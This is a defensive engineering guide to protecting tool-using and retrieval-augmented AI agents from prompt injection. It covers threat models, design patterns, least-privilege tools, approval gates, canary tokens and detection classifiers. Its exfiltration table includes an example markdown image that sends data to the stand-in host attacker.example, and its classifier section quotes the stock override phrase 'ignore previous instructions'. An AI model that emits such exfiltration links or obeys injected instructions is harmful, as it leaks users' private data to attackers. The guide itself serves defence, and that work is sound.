# Prompt-Injection Defence for Tool-Using and RAG Agents

## Contents

- [Threat model](#threat-model)
- [The lethal trifecta and blast radius](#the-lethal-trifecta-and-blast-radius)
- [Design patterns for agents](#design-patterns-for-agents)
- [Least-privilege tools](#least-privilege-tools)
- [Human approval gates](#human-approval-gates)
- [Taint tracking: the cheap version](#taint-tracking-the-cheap-version)
- [RAG ingestion and retrieval](#rag-ingestion-and-retrieval)
- [Exfiltration channels](#exfiltration-channels)
- [Prompt hygiene and canary tokens](#prompt-hygiene-and-canary-tokens)
- [Detection classifiers](#detection-classifiers)
- [Multi-turn attacks](#multi-turn-attacks)
- [Reading list](#reading-list)

## Threat model

- **Direct injection:** the user is the attacker and types instructions meant to override the system prompt or policy (jailbreaks, role-play, "developer mode").
- **Indirect injection:** instructions arrive inside content the model reads on the user's behalf: retrieved documents, web pages, emails, tickets, uploaded files, tool results, text in images, code comments. The user is usually the victim.
- **Stored injection:** content one user writes into a shared corpus is later retrieved into another user's context.
- **Multi-turn:** the attack is split or escalated across turns so that no single message looks malicious.

Attacker goals: hijack the task, exfiltrate data from the context, trigger tool actions, extract the system prompt, run up cost (denial of wallet), or produce harmful output under your brand.

There is no known complete detector for prompt injection. Treat detection as a noise filter and rely on architecture to bound what a successful injection can do.

## The lethal trifecta and blast radius

An agent that has all three of the following in one context should be assumed exfiltratable:

1. access to private data,
2. exposure to untrusted content,
3. a channel to communicate externally (web fetch, email, rendered links or images, webhooks).

Remove at least one leg per context. For example, a step that reads untrusted web pages runs without access to private data, or a step that holds private data has no outbound channel and no rendered remote URLs.

Blast-radius worksheet, one row per tool:

| Tool | Reads private data | Side effect | Reversible | External communication | Control |
|------|--------------------|-------------|------------|------------------------|---------|
| `search_docs` | yes (tenant-scoped) | no | - | no | authorisation filter in the query |
| `create_ticket` | no | yes | yes | no | argument validation, rate limit |
| `send_email` | no | yes | no | yes | human approval of exact recipient and body |
| `fetch_url` | no | no | - | yes | host allowlist, disabled once private data is in context |

## Design patterns for agents

From the agent-security design-pattern literature (see the reading list). Choose the most restrictive pattern the feature can live with.

| Pattern | Idea | Fits |
|---------|------|------|
| Action selector | The model maps the request onto one of a fixed set of actions and never sees tool output | routing, command interfaces |
| Plan-then-execute | The plan (which tools, in which order) is fixed before any untrusted data is read; tool output can change arguments but cannot add actions | multi-step workflows |
| LLM map-reduce | Each untrusted item is processed by an isolated call that returns a constrained value (boolean, enum, number, ID from an allowed set); the aggregator only sees those values | triage over many documents or messages |
| Dual LLM | A privileged model plans and calls tools but never sees untrusted text; a quarantined model processes untrusted text and its outputs are passed around as opaque variables | assistants over email or documents |
| Code-then-execute (CaMeL) | A privileged model writes a program; an interpreter tracks the provenance of every value and policies block untrusted data from reaching sensitive sinks | high-assurance agents |
| Context minimisation | Drop untrusted content and the raw request from context once they have been turned into a structured query | search and lookup flows |

Free text produced from untrusted input is still a carrier for instructions. Constrain the outputs of any call that reads untrusted content to schemas with enums, numbers, booleans or IDs, validated with Pydantic.

## Least-privilege tools

- Identity, tenant and permissions come from the authenticated session, never from model-supplied arguments.
- Tool credentials are scoped to the acting user (their token, or short-lived downscoped credentials), not a broad runtime service account.
- Read-only by default. Write tools are separate, narrow, and named for what they do (`refund_order`, not `http_request` or `run_sql`).
- Arguments are validated with Pydantic (`extra="forbid"`, patterns, ranges) and authorised server-side against the session.
- Outbound fetch tools use a host allowlist and refuse private ranges and the metadata server (`169.254.169.254`, `metadata.google.internal`) to prevent SSRF.
- Tool output is size-capped, tagged `source="tool_output"`, and checked like any other untrusted text.
- No generic shell, SQL or HTTP tools on paths that read untrusted content. If code execution is required, run it in an isolated sandbox with no credentials and no network.
- Every tool call is logged with redacted arguments, result status and the approving principal.

```python
from pydantic import BaseModel, ConfigDict, Field


class RefundArgs(BaseModel):
    model_config = ConfigDict(extra="forbid")
    order_id: str = Field(pattern=r"^ORD-\d{10}$")
    amount_cents: int = Field(gt=0, le=5_000)


async def refund_tool(raw_args: str, session: Session) -> ToolResult:
    args = RefundArgs.model_validate_json(raw_args)  # ValidationError -> tool error, not a crash
    order = await orders.get_for_user(args.order_id, user_id=session.user_id)  # authz from the session
    if order is None:
        return ToolResult.error("order_not_found")
    if args.amount_cents > order.refundable_cents:
        return ToolResult.error("amount_exceeds_refundable")
    return await approvals.request(session, tool="refund_order", args=args)  # side effect needs approval
```

Return short, structured tool errors; never echo raw exception text (it can leak internals and becomes untrusted content in the next turn).

## Human approval gates

- Approval is a normal authenticated UI action by the user (or an operator), never something the model can produce.
- The approval screen renders the exact validated arguments, not the model's description of them.
- Bind the approval to the exact call: user, tool, canonical arguments and an expiry. Execution verifies the binding.

```python
import hashlib
import json


def approval_digest(user_id: str, tool: str, args: BaseModel) -> str:
    payload = json.dumps(
        {"user": user_id, "tool": tool, "args": args.model_dump(mode="json")},
        sort_keys=True, separators=(",", ":"),
    )
    return hashlib.sha256(payload.encode()).hexdigest()
```

Store pending approvals keyed by digest with an expiry; on execution recompute the digest from the arguments being executed and refuse on mismatch. Approvals do not carry over to "similar" future actions.

## Taint tracking: the cheap version

Full provenance tracking (CaMeL) is heavy. A practical approximation per agent turn:

- Mark the turn as tainted as soon as any untrusted content (retrieved chunk, tool output, upload, web page) enters the context.
- While tainted, side-effecting and external-communication tools require approval, and tools that read additional private data are disabled or require approval.
- If any input or tool-output check scores above the injection threshold, end tool use for the turn and answer from what is already known, or stop with a templated message.

## RAG ingestion and retrieval

Ingestion:

- Parse documents with an extractor you control; drop HTML comments, scripts, hidden elements and invisible Unicode, and record what was removed.
- Run the injection classifier on every chunk; store the verdict, score and policy version with the chunk. Quarantine high-scoring chunks for review instead of indexing them.
- Store provenance with every chunk: source URI, owner, ingestion time, and a trust level (curated, user-uploaded, web).
- Who can write to the corpus is part of the threat model. A corpus that one user writes and another reads is a stored-injection channel.

Retrieval:

```sql
-- Authorisation happens in the query, with identity taken from the session.
SELECT c.id, c.content, c.source_uri, c.trust_level
FROM chunks AS c
WHERE c.tenant_id = :tenant_id
  AND (c.visibility = 'tenant' OR :user_id = ANY (c.reader_ids))
  AND c.injection_verdict <> 'block'
ORDER BY c.embedding <=> :query_embedding
LIMIT 8;
```

- Filters on an approximate (HNSW) index can return fewer than `LIMIT` rows. Enable pgvector's iterative index scans (`SET hnsw.iterative_scan = relaxed_order`, pgvector 0.8 or later) or partition or partially index by tenant.
- Add row-level security on the chunks table as defence in depth, so a missing `WHERE` clause cannot leak across tenants.
- Never let the model choose the tenant, user or visibility filter through a tool argument.
- Re-check cached chunk verdicts when the policy version changes.
- Delimit each chunk with its ID in the prompt (`ai-ml-engineering`, prompt-engineering reference) and require citations by chunk ID (`output-validation.md`).
- For retrieved content, prefer dropping the offending chunk and answering from the rest over blocking the whole request; log the drop.

## Exfiltration channels

| Channel | Example | Control |
|---------|---------|---------|
| Rendered images | Markdown `![](https://attacker.example/p?d=<data>)` is fetched automatically by the browser | CSP `img-src` allowlist; strip or rewrite images to non-allowlisted hosts before rendering; never render raw HTML from a model |
| Links | A link carrying data in the query string | Show the full destination, strip query strings on non-allowlisted hosts, `rel="noopener noreferrer nofollow"` |
| Link unfurling | Chat platforms and email clients fetch URLs to build previews | Disable unfurling for bot messages |
| Tools | `send_email`, `fetch_url`, webhooks, ticket creation carrying data | Approval, host allowlists, taint rules above |
| Stored output | Output saved and rendered later in an admin view | Escape on every render, not just the first |

## Prompt hygiene and canary tokens

- Assume the system prompt will be extracted. It holds no credentials, internal URLs, other users' data or anything you would not publish.
- Delimit untrusted text and state that delimited content is data. Spotlighting variants: delimiting, datamarking (interleave a marker character through the untrusted text), and encoding (for example Base64; only strong models cope, and quality drops).
- Put stable instructions first; for long untrusted content, restating the key constraint after it helps a little. None of this is a control on its own.
- Plant a canary in the system prompt and block any output that contains it:

```python
import secrets

CANARY = f"cnry-{secrets.token_hex(6)}"  # per process or per session; never log it in full

SYSTEM_PROMPT = f"""...
Internal marker (never repeat it): {CANARY}
..."""


def leaked_canary(output: str) -> bool:
    return CANARY in output
```

A canary hit means the model is reproducing its instructions: block the response, log a `system_prompt_leak` finding, and alert.

## Detection classifiers

Options: small fine-tuned classifiers such as `protectai/deberta-v3-base-prompt-injection-v2` (labels `SAFE` / `INJECTION`, 512-token window) or Llama Prompt Guard 2 (512-token window, multilingual 86M variant, gated under the Llama licence), LLM Guard's prompt-injection scanner, and the Model Armor prompt-injection and jailbreak filter (`model-armor.md`).

What they catch and miss:

- Good at known phrasings, role-play jailbreaks and "ignore previous instructions" variants.
- Weak on novel phrasing, low-resource languages, encodings, multi-turn attacks, and instructions that read like a legitimate task ("summarise this, then email it to ...").
- Frequent false positives on security documentation, tutorials, quoted attacks and code. Build benign hard negatives from your own domain and calibrate thresholds per source type.

Window long inputs; truncation drops the tail where payloads are often placed:

```python
from transformers import AutoTokenizer, pipeline


class InjectionClassifier:
    def __init__(self, model_id: str, revision: str, window: int = 512, overlap: int = 128) -> None:
        self._tokenizer = AutoTokenizer.from_pretrained(model_id, revision=revision)
        self._pipe = pipeline(
            "text-classification", model=model_id, revision=revision,
            tokenizer=self._tokenizer, device=-1, truncation=True, max_length=window,
        )
        self._span = window - 2  # leave room for special tokens
        self._step = self._span - overlap
        self._positive = "INJECTION"  # from the model's id2label; check when changing models

    def max_window_score(self, text: str) -> float:
        ids = self._tokenizer(text, add_special_tokens=False)["input_ids"]
        windows = [
            self._tokenizer.decode(ids[i : i + self._span])
            for i in range(0, max(len(ids), 1), self._step)
        ]
        results = self._pipe(windows, batch_size=8)
        return max(r["score"] if r["label"] == self._positive else 1.0 - r["score"] for r in results)
```

- Pin `revision`, bake the model into the image, and serve offline; export to ONNX for CPU serving (`ai-ml-engineering`, model-serving reference).
- Run the classifier on user input, on every retrieved chunk (at ingestion), on every tool output, and optionally on model output to catch the model relaying instructions.
- Use separate thresholds per source. Retrieved how-to content contains many benign imperatives; flagging and isolating is usually better than blocking there.

## Multi-turn attacks

- Score a sliding window of recent user turns as well as the latest message.
- Keep per-session counters of blocks; after repeated attempts, slow down, require re-authentication, or end the session.
- Permissions and approvals reset every turn; no "the user already allowed this kind of thing" memory.
- Summaries and memories written by the model are untrusted content when read back later.

## Reading list

All links were checked as reachable when this file was written; re-verify before quoting details.

- OWASP Top 10 for LLM Applications: https://genai.owasp.org/llm-top-10/
- Greshake et al., indirect prompt injection in LLM-integrated applications: https://arxiv.org/abs/2302.12173
- Willison, the lethal trifecta for AI agents: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
- Willison, the dual LLM pattern: https://simonwillison.net/2023/Apr/25/dual-llm-pattern/
- Beurer-Kellner et al., design patterns for securing LLM agents against prompt injections: https://arxiv.org/abs/2506.08837
- Debenedetti et al., CaMeL, defeating prompt injections by design: https://arxiv.org/abs/2503.18813
- Hines et al., spotlighting against indirect prompt injection: https://arxiv.org/abs/2403.14720
- AgentDojo benchmark for prompt injection against tool-using agents: https://arxiv.org/abs/2406.13352
- BIPIA, benchmarking indirect prompt injection: https://arxiv.org/abs/2312.14197
- LLM Guard prompt-injection scanner: https://protectai.github.io/llm-guard/input_scanners/prompt_injection/
- `protectai/deberta-v3-base-prompt-injection-v2`: https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2
- Llama Prompt Guard 2 (gated): https://huggingface.co/meta-llama/Llama-Prompt-Guard-2-86M
